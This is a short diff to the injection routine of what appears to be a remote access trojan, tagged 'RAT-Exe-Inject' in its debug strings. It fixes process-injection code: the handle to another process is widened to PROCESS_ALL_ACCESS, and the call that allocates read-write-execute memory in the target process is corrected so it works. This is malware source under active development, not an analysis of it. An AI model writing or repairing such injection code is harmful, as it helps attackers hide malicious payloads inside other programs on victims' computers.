@@ -42,7 +42,8 @@ INT inject(__in UINT32 PID, __in UINT64 payloadSize, __in VOID* payloadBytes)
 	sprintf_s(messageBuffer, "RAT-Exe-Inject::inject - Injecting into process %d\n", PID);
 	OutputDebugStringA(messageBuffer);
 
-	hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, PID);
+	//hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, PID);
+	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
 	if (hProcess == NULL)
 	{
 		OutputDebugStringA("RAT-Exe-Inject::inject - Failed to open handle to target process!\n");
@@ -50,7 +51,7 @@ INT inject(__in UINT32 PID, __in UINT64 payloadSize, __in VOID* payloadBytes)
 	}
 
 	// allocate memory in target process
-	baseAddress = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	baseAddress = VirtualAllocEx(hProcess, NULL, payloadSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
 	if (baseAddress == NULL)
 	{
 		sprintf_s(messageBuffer, "RAT-Exe-Inject::inject - Failed to allocate memory in target process! Error %d\n", GetLastError());
